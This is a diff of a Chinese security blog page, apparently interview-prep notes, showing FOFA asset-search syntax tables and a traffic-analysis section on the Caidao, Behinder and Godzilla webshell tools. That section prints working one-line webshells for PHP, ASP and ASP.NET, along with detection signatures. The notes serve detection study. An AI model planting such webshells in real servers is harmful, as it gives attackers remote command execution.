+<td>ip&#x3D;”1.1.1.1”</td>
+<td>通过单一IPv4地址进行查询</td>
+<td>✓</td>
+<td>✓</td>
+<td>-</td>
+</tr>
+<tr>
+<td>ip&#x3D;”220.181.111.1&#x2F;24”</td>
+<td>通过IPv4 C段进行查询</td>
+<td>✓</td>
+<td>✓</td>
+<td>-</td>
+<td></td>
+</tr>
+<tr>
+<td>port</td>
+<td>port&#x3D;”6379”</td>
+<td>通过端口号进行查询</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+</tr>
+<tr>
+<td>domain</td>
+<td>domain&#x3D;”qq.com”</td>
+<td>通过根域名进行查询</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+</tr>
+<tr>
+<td>server</td>
+<td>server&#x3D;”Microsoft-IIS&#x2F;10”</td>
+<td>通过服务器进行查询</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+</tr>
+<tr>
+<td>os</td>
+<td>os&#x3D;”centos”</td>
+<td>通过操作系统进行查询</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+</tr>
+</tbody></table>
+<p>标记类</p>
+<table>
+<thead>
+<tr>
+<th>语法</th>
+<th>示例</th>
+<th>用途说明</th>
+<th>&#x3D;</th>
+<th>!&#x3D;</th>
+<th>*&#x3D;</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>app</td>
+<td>app&#x3D;”Microsoft-Exchange”</td>
+<td>通过FOFA整理的规则进行查询</td>
+<td>✓</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>product</td>
+<td>product&#x3D;”NGINX”</td>
+<td>通过FOFA标记的产品名进行查询</td>
+<td>✓</td>
+<td>✓</td>
+<td>-</td>
+</tr>
+<tr>
+<td>type</td>
+<td>type&#x3D;”service”</td>
+<td>筛选协议资产</td>
+<td>✓</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>type&#x3D;”subdomain”</td>
+<td>筛选服务（网站类）资产</td>
+<td>✓</td>
+<td>-</td>
+<td>-</td>
+<td></td>
+</tr>
+<tr>
+<td>cloud_name</td>
+<td>cloud_name&#x3D;”Aliyundun”</td>
+<td>通过云服务商进行查询</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+</tr>
+</tbody></table>
+<p>协议类（type&#x3D;service）</p>
+<table>
+<thead>
+<tr>
+<th>语法</th>
+<th>示例</th>
+<th>用途说明</th>
+<th>&#x3D;</th>
+<th>!&#x3D;</th>
+<th>*&#x3D;</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>protocol</td>
+<td>protocol&#x3D;”quic”</td>
+<td>通过协议名称进行查询</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+</tr>
+<tr>
+<td>banner</td>
+<td>banner&#x3D;”users”</td>
+<td>通过协议返回信息进行查询</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+</tr>
+</tbody></table>
+<p>网站类（type&#x3D;subdomain）</p>
+<table>
+<thead>
+<tr>
+<th>语法</th>
+<th>示例</th>
+<th>用途说明</th>
+<th>&#x3D;</th>
+<th>!&#x3D;</th>
+<th>*&#x3D;</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>title</td>
+<td>title&#x3D;”beijing”</td>
+<td>通过网站标题进行查询</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+</tr>
+<tr>
+<td>header</td>
+<td>header&#x3D;”elastic”</td>
+<td>通过响应标头进行查询</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+</tr>
+<tr>
+<td>body</td>
+<td>body&#x3D;”网络空间测绘”</td>
+<td>通过HTML正文进行查询</td>
+<td>✓</td>
+<td>✓</td>
+<td>-</td>
+</tr>
+</tbody></table>
+<p>地理位置</p>
+<table>
+<thead>
+<tr>
+<th>语法</th>
+<th>示例</th>
+<th>用途说明</th>
+<th>&#x3D;</th>
+<th>!&#x3D;</th>
+<th>*&#x3D;</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>country</td>
+<td>country&#x3D;”CN”</td>
+<td>通过国家的简称代码进行查询</td>
+<td>✓</td>
+<td>✓</td>
+<td>-</td>
+</tr>
+<tr>
+<td>region</td>
+<td>region&#x3D;”Zhejiang”</td>
+<td>通过省份&#x2F;地区英文名称进行查询</td>
+<td>✓</td>
+<td>✓</td>
+<td>-</td>
+</tr>
+<tr>
+<td>city</td>
+<td>city&#x3D;”Hangzhou”</td>
+<td>通过城市英文名称进行查询</td>
+<td>✓</td>
+<td>✓</td>
+<td>-</td>
+</tr>
+</tbody></table>
+<p>证书类</p>
+<table>
+<thead>
+<tr>
+<th>语法</th>
+<th>示例</th>
+<th>用途说明</th>
+<th>&#x3D;</th>
+<th>!&#x3D;</th>
+<th>*&#x3D;</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>cert</td>
+<td>cert&#x3D;”baidu”</td>
+<td>通过证书进行查询</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+</tr>
+<tr>
+<td>cert.subject</td>
+<td>cert.subject&#x3D;”Oracle Corporation”</td>
+<td>通过证书的持有者进行查询</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+</tr>
+<tr>
+<td>cert.issuer</td>
+<td>cert.issuer&#x3D;”DigiCert”</td>
+<td>通过证书的颁发者进行查询</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+</tr>
+</tbody></table>
+<p>时间类</p>
+<table>
+<thead>
+<tr>
+<th>语法</th>
+<th>示例</th>
+<th>用途说明</th>
+<th>&#x3D;</th>
+<th>!&#x3D;</th>
+<th>*&#x3D;</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>after</td>
+<td>after&#x3D;”2023-01-01”</td>
+<td>筛选某一时间之后有更新的资产</td>
+<td>✓</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>before</td>
+<td>before&#x3D;”2023-12-01”</td>
+<td>筛选某一时间之前有更新的资产</td>
+<td>✓</td>
+<td>-</td>
+<td>-</td>
+</tr>
+</tbody></table>
+<p>独立IP语法</p>
+<table>
+<thead>
+<tr>
+<th>语法</th>
+<th>示例</th>
+<th>用途说明</th>
+<th>&#x3D;</th>
+<th>!&#x3D;</th>
+<th>*&#x3D;</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>port_size</td>
+<td>port_size&#x3D;”6”</td>
+<td>筛选开放端口数量等于6个的独立IP</td>
+<td>✓</td>
+<td>✓</td>
+<td>-</td>
+</tr>
+<tr>
+<td>ip_ports</td>
+<td>ip_ports&#x3D;”80,161”</td>
+<td>筛选同时开放不同端口的独立IP</td>
+<td>✓</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>ip_country</td>
+<td>ip_country&#x3D;”CN”</td>
+<td>通过国家的简称代码进行查询独立IP</td>
+<td>✓</td>
+<td>-</td>
+<td>-</td>
+</tr>
+</tbody></table>
+<p>逻辑连接符</p>
+<table>
+<thead>
+<tr>
+<th>符号</th>
+<th>含义</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&#x3D;</td>
+<td>匹配，&#x3D;””时，可查询不存在字段或者值为空的情况</td>
+<td>ip&#x3D;”1.1.1.1”</td>
+</tr>
+<tr>
+<td>&#x3D;&#x3D;</td>
+<td>完全匹配，&#x3D;&#x3D;””时，可查询存在且值为空的情况</td>
+<td>-</td>
+</tr>
+<tr>
+<td>&amp;&amp;</td>
+<td>与</td>
+<td>ip&#x3D;”1.1.1.1” &amp;&amp; port&#x3D;”6379”</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>!&#x3D;</td>
+<td>不匹配，!&#x3D;””时，可查询值不为空的情况</td>
+<td>port!&#x3D;”6379”</td>
+</tr>
+<tr>
+<td>*&#x3D;</td>
+<td>模糊匹配，使用*或者?进行搜索</td>
+<td>banner*&#x3D;”mys??”</td>
+</tr>
+</tbody></table>
+<h3 id="菜刀，蚁剑，冰蝎，哥斯拉"><a href="#菜刀，蚁剑，冰蝎，哥斯拉" class="headerlink" title="菜刀，蚁剑，冰蝎，哥斯拉"></a>菜刀，蚁剑，冰蝎，哥斯拉</h3><p><strong>菜刀</strong><br>payload特征：<br>PHP: <?php @eval($_POST['caidao']);?></p>
+<p>ASP: &lt;%eval request(“caidao”)%&gt;</p>
+<p>ASP.NET: &lt;%@ Page<br>Language&#x3D;“Jscript”%&gt;&lt;%eval(Request.Item[“caidao”],“unsafe”);%&gt;</p>
+<p>数据包流量特征：<br>1，请求包中：ua头为百度，火狐<br>2，请求体中存在eavl，base64等特征字符<br>3，请求体中传递的payload为base64编码，并且存在固定的QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J<br><strong>冰蝎流量分析</strong><br>paylaod分析：<br>php在代码中同样会存在eval或assert等字符特征<br>在aps中会在for循环进行一段异或处理</p>
+<p>在jsp中则利用java的反射，所以会存在ClassLoader，getClass().getClassLoader()等字符特征</p>
+<p>冰蝎2.0流量特征：<br>第一阶段请求中返回包状态码为200，返回内容必定是16位的密钥<br>请求包存在：Accept: text&#x2F;html, image&#x2F;gif, image&#x2F;jpeg, ; q&#x3D;.2, &#x2F;; q&#x3D;.2</p>
+<p>建立连接后的cookie存在特征字符<br>所有请求 Cookie的格式都为: Cookie: PHPSESSID&#x3D;; path&#x3D;&#x2F;；</p>
+<p>冰蝎3.0流量特征：<br>请求包中content-length 为5740或5720（可能会根据Java版本而改变）<br>每一个请求头中存在<br>Pragma: no-cache，Cache-Control: no-cache<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9<br><strong>哥斯拉流量</strong><br>payload特征：<br>jsp会出现xc,pass字符和Java反射（ClassLoader，getClass().getClassLoader()），base64加解码等特征<br>php，asp则为普通的一句话木马</p>
+<p>哥斯拉流量分析：<br>作为参考：<br>所有请求中Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,&#x2F;;q&#x3D;0.8<br>所有响应中Cache-Control: no-store, no-cache, must-revalidate,<br>同时在所有请求中Cookie中后面都存在；特征</p>
 
   </div>
 </article>
@@ -766,7 +1391,7 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-%E9%99%A4%E4%BA%86-xp-cmdshell%E3%80%81sp-oacreate-%E8%BF%98%E6%9C%89%E4%BB%80%E4%B9%88%E5%8A%9E%E6%B3%95%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%9F"><span class="toc-number">1.</span> <span class="toc-text">MSSQL 除了 xp_cmdshell、sp_oacreate 还有什么办法执行命令？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CLR-%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E6%B5%81%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">CLR 原理以及流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle-%E8%83%BD%E4%B8%8D%E8%83%BD-RCE%EF%BC%9F%E6%80%8E%E4%B9%88-RCE%EF%BC%9F%E5%89%8D%E7%BD%AE%E6%9D%A1%E4%BB%B6%E6%98%AF%E5%95%A5%EF%BC%9F"><span class="toc-number">3.</span> <span class="toc-text">Oracle 能不能 RCE？怎么 RCE？前置条件是啥？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Autotype-false-%E7%BB%95%E8%BF%87%E6%9C%89%E5%87%A0%E7%A7%8D%E6%80%9D%E8%B7%AF%EF%BC%9F"><span class="toc-number">4.</span> <span class="toc-text">Autotype&#x3D;false 绕过有几种思路？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHPInfo-%E4%BD%A0%E4%BC%9A%E5%85%B3%E6%B3%A8%E5%93%AA%E4%BA%9B%E4%BF%A1%E6%81%AF"><span class="toc-number">5.</span> <span class="toc-text">PHPInfo 你会关注哪些信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E9%A1%BA%E5%BA%8F%E5%92%8C%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F"><span class="toc-number">6.</span> <span class="toc-text">浏览器解析顺序和解码顺序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4limit%E5%90%8E%E7%9A%84%E9%80%97%E5%8F%B7%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87"><span class="toc-number">7.</span> <span class="toc-text">过滤limit后的逗号如何绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87"><span class="toc-number">8.</span> <span class="toc-text">过滤逗号的SQL注入如何绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%88SSTI%E5%8E%9F%E7%90%86%EF%BC%8C%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%8Cpayload%E7%9B%B8%E5%85%B3%E7%9A%84%E4%B8%9C%E8%A5%BF%EF%BC%89"><span class="toc-number">9.</span> <span class="toc-text">Python相关的漏洞（SSTI原理，利用过程，payload相关的东西）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">10.</span> <span class="toc-text">Java 内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E%E3%80%81%E5%93%A5%E6%96%AF%E6%8B%89%E5%B7%A5%E5%85%B7"><span class="toc-number">11.</span> <span class="toc-text">冰蝎、哥斯拉工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A1%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%BC%95%E6%93%8E%E7%9A%84%E6%AD%A5%E9%AA%A4%E5%92%8C%E6%80%9D%E8%B7%AF"><span class="toc-number">12.</span> <span class="toc-text">审表达式引擎的步骤和思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E5%88%86%E6%9E%90"><span class="toc-number">13.</span> <span class="toc-text">XXE漏洞成因及代码层面分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%87%E5%88%B0ORDER-BY%E6%97%B6%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-number">14.</span> <span class="toc-text">遇到ORDER BY时的防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">15.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E8%BD%AC%E4%B9%89%E6%97%B6%E7%9A%84%E5%A4%84%E7%90%86"><span class="toc-number">16.</span> <span class="toc-text">特殊字符转义时的处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%BF%AE%E5%A4%8D%E5%9C%A8Docker%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8"><span class="toc-number">17.</span> <span class="toc-text">基于黑白名单的修复在Docker环境中的应用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%B5%81%E7%A8%8B"><span class="toc-number">18.</span> <span class="toc-text">Java系统代码审计流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E7%B3%BB%E7%BB%9F%E4%B8%ADSQL%E6%B3%A8%E5%85%A5%E7%9A%84%E9%98%B2%E5%BE%A1%E4%B8%8E%E4%BF%AE%E5%A4%8D"><span class="toc-number">19.</span> <span class="toc-text">Java系统中SQL注入的防御与修复</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">19.1.</span> <span class="toc-text">防御措施</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95"><span class="toc-number">19.2.</span> <span class="toc-text">修复方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%97%B6%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%85%A5%E6%89%8B%E7%82%B9"><span class="toc-number">20.</span> <span class="toc-text">反序列化时的魔术方法入手点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8PHP%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%88%A9%E7%94%A8SSRF"><span class="toc-number">21.</span> <span class="toc-text">在PHP环境下利用SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E4%BB%A3%E7%A0%81%E5%B8%B8%E8%A7%81%E5%85%A5%E5%8F%A3%E5%87%BD%E6%95%B0%E7%9A%84%E6%9F%A5%E6%89%BE"><span class="toc-number">22.</span> <span class="toc-text">PHP代码常见入口函数的查找</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E7%9A%84URL%E8%B7%AF%E7%94%B1%E6%96%B9%E6%B3%95"><span class="toc-number">23.</span> <span class="toc-text">PHP开发框架的URL路由方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%92%8C%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%B6%89%E5%8F%8A%E7%9A%84PHP%E8%AE%BE%E7%BD%AE"><span class="toc-number">24.</span> <span class="toc-text">远程文件包含和本地文件包含涉及的PHP设置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84PHP%E9%85%8D%E7%BD%AE%E9%99%90%E5%88%B6"><span class="toc-number">25.</span> <span class="toc-text">本地文件包含的PHP配置限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%9C%A8%E5%81%9ASQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E6%97%B6%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">26.</span> <span class="toc-text">PHP在做SQL注入防御时的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E8%A7%A3%E5%86%B3%E4%BA%86%E4%BB%80%E4%B9%88%E9%97%AE%E9%A2%98%EF%BC%9F"><span class="toc-number">27.</span> <span class="toc-text">Redis解决了什么问题？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%83%AD%E7%82%B9%E6%95%B0%E6%8D%AE%E6%80%8E%E4%B9%88%E4%BF%9D%E8%AF%81Redis%E5%92%8CDB%E4%B8%AD%E7%9A%84%E4%B8%80%E8%87%B4%EF%BC%9F"><span class="toc-number">28.</span> <span class="toc-text">热点数据怎么保证Redis和DB中的一致？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81%E6%98%AF%E6%80%8E%E4%B9%88%E5%81%9A%E7%9A%84%EF%BC%9F"><span class="toc-number">29.</span> <span class="toc-text">用户登录认证是怎么做的？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Token%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%8E%E4%B9%88%E4%BF%9D%E6%8A%A4%EF%BC%9F"><span class="toc-number">30.</span> <span class="toc-text">Token的安全怎么保护？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Token%E7%9A%84%E5%86%85%E5%AE%B9%E8%AF%A5%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%EF%BC%9F"><span class="toc-number">31.</span> <span class="toc-text">Token的内容该如何设计？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E4%BF%9D%E8%AF%81%E6%95%B0%E6%8D%AE%E4%B8%8D%E8%A2%AB%E7%AF%A1%E6%94%B9%E5%91%A2%EF%BC%9F"><span class="toc-number">32.</span> <span class="toc-text">怎么保证数据不被篡改呢？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8CCSRF%E9%98%B2%E5%BE%A1%EF%BC%9F"><span class="toc-number">33.</span> <span class="toc-text">如何进行CSRF防御？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%A1%E9%AA%8C%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">34.</span> <span class="toc-text">校验什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Token%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E5%8A%A0%E5%AF%86%EF%BC%9F"><span class="toc-number">35.</span> <span class="toc-text">Token为什么需要加密？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E6%B2%A1%E6%9C%89%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99%E8%BF%87%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7"><span class="toc-number">36.</span> <span class="toc-text">有没有自己动手写过一些工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%8E%A2%E6%B5%8B%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%8F%82%E6%95%B0%E6%98%AF%E4%BB%80%E4%B9%88-%E2%80%94-%E5%A4%A7%E5%86%99%E8%BF%98%E6%98%AF%E5%B0%8F%E5%86%99"><span class="toc-number">37.</span> <span class="toc-text">nmap探测系统的参数是什么 —&gt;大写还是小写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E7%9A%84%E5%B0%8F%E5%86%99o%E4%B8%8Ea%E6%98%AF%E5%B9%B2%E5%98%9B%E7%9A%84"><span class="toc-number">38.</span> <span class="toc-text">nmap的小写o与a是干嘛的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%B8%B2%E7%BC%96%E7%A0%81%E5%A6%82%E4%BD%95%E7%A1%AE%E8%AE%A4%E6%98%AFbase64"><span class="toc-number">39.</span> <span class="toc-text">一串编码如何确认是base64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%85%E6%A0%8F%E5%AF%86%E7%A0%81%E7%9A%84%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">40.</span> <span class="toc-text">栅栏密码的原理是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base64%E4%B8%8Emd5%E5%A6%82%E4%BD%95%E5%8C%BA%E5%88%AB"><span class="toc-number">41.</span> <span class="toc-text">base64与md5如何区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#oracle%E7%9A%84%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3%E6%98%AF%E5%A4%9A%E5%B0%91"><span class="toc-number">42.</span> <span class="toc-text">oracle的默认端口是多少</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E7%9A%84%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E4%B8%80%E8%88%AC%E6%94%BE%E5%88%B0%E5%93%AA"><span class="toc-number">43.</span> <span class="toc-text">mysql的管理员密码一般放到哪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9Csubstr-%E5%87%BD%E6%95%B0%E8%A2%AB%E7%A6%81%E7%94%A8%EF%BC%8C%E4%BD%A0%E8%84%91%E5%AD%90%E9%87%8C%E6%9C%89%E5%A4%9A%E5%B0%91%E6%9B%BF%E6%8D%A2%E5%87%BD%E6%95%B0"><span class="toc-number">44.</span> <span class="toc-text">如果substr()函数被禁用，你脑子里有多少替换函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E5%A6%82%E4%BD%95%E6%8B%BF%E4%B8%8B%EF%BC%8C%E5%93%AA%E4%B8%AA%E7%AB%AF%E5%8F%A3%EF%BC%8C%E5%85%B7%E4%BD%93%E8%AF%AD%E5%8F%A5%EF%BC%8C%E5%85%B7%E4%BD%93%E6%93%8D%E4%BD%9C"><span class="toc-number">45.</span> <span class="toc-text">redis如何拿下，哪个端口，具体语句，具体操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E9%82%AE%E7%AE%B1%E7%9F%A5%E9%81%93%E5%AF%B9%E6%96%B9%E7%9A%84IP"><span class="toc-number">46.</span> <span class="toc-text">如何通过邮箱知道对方的IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Struct2%E6%BC%8F%E6%B4%9E"><span class="toc-number">47.</span> <span class="toc-text">Struct2漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%B6%E5%AD%90%E8%BF%9B%E7%A8%8B%E7%9A%84%E4%BB%8B%E7%BB%8D"><span class="toc-number">48.</span> <span class="toc-text">父子进程的介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%A4%E5%84%BF%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B"><span class="toc-number">49.</span> <span class="toc-text">孤儿进程和僵尸进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F"><span class="toc-number">50.</span> <span class="toc-text">反弹shell的几种方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">51.</span> <span class="toc-text">Linux开机自启动方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#init-d%E8%84%9A%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="toc-number">52.</span> <span class="toc-text">init.d脚本介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E6%80%8E%E4%B9%88%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E8%B0%83%E7%94%A8%E4%BA%86%E5%93%AA%E4%BA%9B%E6%96%87%E4%BB%B6"><span class="toc-number">53.</span> <span class="toc-text">Linux怎么查看程序调用了哪些文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%9B%91%E6%8E%A7Linux%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">54.</span> <span class="toc-text">如何监控Linux文件操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E6%9C%89%E5%93%AA%E4%BA%9B%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">55.</span> <span class="toc-text">Linux有哪些系统调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8BLinux%E5%BC%80%E6%94%BE%E7%9A%84%E7%BD%91%E7%BB%9C%E7%AB%AF%E5%8F%A3"><span class="toc-number">56.</span> <span class="toc-text">查看Linux开放的网络端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8BLinux%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%8A%B6%E6%80%81"><span class="toc-number">57.</span> <span class="toc-text">查看Linux多线程状态</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E4%B8%8B%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6"><span class="toc-number">58.</span> <span class="toc-text">Linux下隐藏文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86"><span class="toc-number">59.</span> <span class="toc-text">子域名收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E9%87%8D%E7%BB%91%E5%AE%9A"><span class="toc-number">60.</span> <span class="toc-text">DNS重绑定</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-number">61.</span> <span class="toc-text">DNS解析的流程</span></a></li><li class="toc-item toc-level-3"><a 